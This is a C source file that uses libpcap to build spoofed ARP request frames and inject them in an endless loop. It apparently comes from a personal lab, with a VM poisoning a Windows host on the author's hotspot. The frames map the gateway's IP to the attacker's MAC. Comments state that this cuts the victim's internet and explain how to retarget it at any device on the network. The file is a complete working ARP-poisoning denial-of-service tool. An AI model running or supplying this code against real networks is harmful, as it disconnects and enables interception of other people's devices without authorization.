#include<time.h>
#include<pcap.h>
#include<netinet/in.h>
#include<netinet/if_ether.h>
#include<stdio.h>
#include<arpa/inet.h>	//IPPROTO_RAW
#include<string.h>	//memset
#include<net/if.h>	//if_req
#include<linux/ip.h>
#include<linux/tcp.h>
#include<linux/udp.h>
#include<linux/sockios.h>
#include<sys/ioctl.h>
#include<linux/if_ether.h>
#include<netinet/ether.h>
#include<linux/if_packet.h>
#include<sys/wait.h>
#include<unistd.h>


//connected to my mobile hotspot(router), so the IPs change when we switch to other network
char* src_mac_str = "08:00:27:21:58:3E"; //MY UBUNTU MAC
char* dest_mac_str = "FF:FF:FF:FF:FF:FF";//BROADCAST
char* src_ip_str = "192.168.160.235";//GATEWAY'S IP (SPOOFING AS MINE - MY IP : 192.169.173.230)
char* dest_ip_str = "192.168.160.70";//"192.168.173.70";//WINDOWS' IP

//1. ARP PACKET FIRST GOES TO ROUTER 
//2. ROUTER CHECKS THAT ITS IP IS NOT THE SAME AS DESTINATION IP IN THE PACKET
//3. ROUTER BROADCASTS THE PACKET
//4. WINDOWS REPLYS BECAUSE IT IS THE DESTINATION
//5. WINDOWS ALSO OBSERVES THE SOURCE IP - MAC MAPPING IN THE ARP PACKET AND LEARNS IT AND UPDATES IT ARP CACHE WITH MAPPING AS 192.168.173.183 -> 08:00:27:21:58:3E WHICH IS NOT A CRCT MAPPING
//6. THIS LEADS TO DISRUPTION OF INTERNET ON MY WINDOWS
//7. TO STOP INTERNET ON ANY OTHER DEVICE CHANGE THE dest_ip_str TO THE DEVICE'S IP WHILE STILL SETTING THE src_ip_str AS GATEWAY'S IP ONLY.

void printEthHdr(char* packet){
	struct ethhdr* eth = (struct ethhdr*)packet;
	printf("\n********ETHERNET HEADER********\n\n");
	
	printf("\t|-Source Address : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n",eth->h_source[0],eth->h_source[1],eth->h_source[2],eth->h_source[3],eth->h_source[4],eth->h_source[5]);
	printf("\t|-Destination Address : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n",eth->h_dest[0],eth->h_dest[1],eth->h_dest[2],eth->h_dest[3],eth->h_dest[4],eth->h_dest[5]);
	printf("\t|-Protocol : %d\n",ntohs(eth->h_proto));
}

void printArpHdr(struct ether_arp* arpHdr){

    printf("\n********ARP Header********\n");
    printf("\t|-HW Type : %d\n",ntohs(arpHdr->arp_hrd));
    printf("\t|-Protocol : %d\n",ntohs(arpHdr->arp_pro));
    printf("\t|-HW Len : %d\n",arpHdr->arp_hln);
    printf("\t|-Protocol Len : %d\n",arpHdr->arp_pln);
    printf("\t|-OpCode : %d\n",ntohs(arpHdr->arp_op));
    printf("\t|-Source MAC : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n",arpHdr->arp_sha[0],arpHdr->arp_sha[1],arpHdr->arp_sha[2],arpHdr->arp_sha[3],arpHdr->arp_sha[4],arpHdr->arp_sha[5]);
    if(ntohs(arpHdr->arp_op) == 2)
    printf("\t|-Destination MAC : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n",arpHdr->arp_tha[0],arpHdr->arp_tha[1],arpHdr->arp_tha[2],arpHdr->arp_tha[3],arpHdr->arp_tha[4],arpHdr->arp_tha[5]);
    printf("\t|-Sender IP: %u.%u.%u.%u\n",arpHdr->arp_spa[0], arpHdr->arp_spa[1], arpHdr->arp_spa[2], arpHdr->arp_spa[3]);
    printf("\t|-Target IP: %u.%u.%u.%u\n", arpHdr->arp_tpa[0], arpHdr->arp_tpa[1], arpHdr->arp_tpa[2], arpHdr->arp_tpa[3]);
}

void fillEtherHdr(char* packet){
	struct ether_header *eth = (struct ether_header*)packet;
	eth->ether_type=htons(ETH_P_ARP);
	if (ether_aton_r(dest_mac_str, (struct ether_addr*)&eth->ether_dhost) == NULL) {
		printf("Error converting destination MAC address\n");
	}

	if (ether_aton_r(src_mac_str, (struct ether_addr*)&eth->ether_shost) == NULL) {
		printf("Error converting source MAC address\n");
	}
	printEthHdr(packet);
}

void fillArpHdr(char* packet,int opCode){
	struct ether_arp* arp = (struct ether_arp*)packet;

    	arp->arp_hrd = htons(ARPHRD_ETHER);
    	arp->arp_pro = htons(ETHERTYPE_IP);
    	arp->arp_hln = 6;
    	arp->arp_pln = 4;
    	
    	if(opCode == 1)
    		arp->arp_op = htons(ARPOP_REQUEST);
    	else
    		arp->arp_op = htons(ARPOP_REPLY);

    	// Convert source MAC address string to binary
    	if (ether_aton_r(src_mac_str, (struct ether_addr*)&arp->arp_sha) == NULL) {
        	printf("Error converting source MAC address\n");
        	return;
    	}

    	// Convert source IP address string to binary
    	if (inet_pton(AF_INET, src_ip_str, &arp->arp_spa) != 1) {
        	printf("Error converting source IP address\n");
        	return;
    	}

    	if(opCode == 1)
    		memset(&arp->arp_tha, 0, sizeof(struct ether_addr));
    	else if (ether_aton_r(dest_mac_str, (struct ether_addr*)&arp->arp_tha) == NULL) {
        	printf("Error converting target MAC address\n");
        	return;
    	}
    		

    	// Convert destination IP address string to binary
    	if (inet_pton(AF_INET, dest_ip_str, &arp->arp_tpa) != 1) {
        	printf("Error converting destination IP address\n");
        	return;
    	}
    	
    	printArpHdr(arp);
}

void injector(int arp_flag){
	char *device;
	char error_buffer[PCAP_ERRBUF_SIZE];
    	pcap_t *handle;
    	int timeout_limit = 10000; /* In milliseconds */
    
    	device = "enp0s3";

    	handle = pcap_open_live(
            device,
            BUFSIZ,
            0,
            timeout_limit,
            error_buffer
        );
    	if (handle == NULL) {
         	printf("Could not open device %s: %s\n", device, error_buffer);
     	}
     
     	if(arp_flag){
     		char frame[sizeof(struct ether_header)+sizeof(struct ether_arp)];
     		fillEtherHdr(frame);
     		fillArpHdr(frame + sizeof( struct ether_header),1);
     		while(1){
	     		if (pcap_inject(handle,frame,sizeof(struct ether_header)+sizeof(struct ether_arp)) == -1) {
				pcap_perror(handle,0);
				pcap_close(handle);
	    		}
    		}
     	}
}

int main(){
	injector(1);
}
